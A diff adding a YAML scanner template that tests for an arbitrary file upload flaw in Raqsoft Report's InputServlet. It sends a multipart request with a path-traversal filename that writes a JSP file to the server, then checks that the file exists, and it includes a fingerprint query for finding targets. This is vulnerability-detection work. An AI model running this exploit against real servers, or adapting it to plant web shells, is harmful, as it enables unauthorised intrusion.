@@ -1,0 +1,39 @@
+id: poc-yaml-raqsoft-inputservlet-anyfile-upload
+info:
+  name: 润乾报表 InputServlet 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 润乾报表
+  hunter: app.name="润乾报表平台"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /InputServlet?action=12
+  headers:
+    Content-Type: multipart/form-data; boundary=--------------------------170005680039721412137562
+  data: '----------------------------170005680039721412137562
+
+    Content-Disposition: form-data; name="upsize"
+
+
+    1024
+
+    ----------------------------170005680039721412137562
+
+    Content-Disposition: form-data; name="file"; filename="/\..\\..\\..\{{.t1}}.jsp"
+
+    Content-Type: image/png
+
+
+    {{.t2}}
+
+    ----------------------------170005680039721412137562--'
+  expression: status_code == 200 && contains(body,"parent._uploadFileSuccess")
+- method: GET
+  path: /{{.t1}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
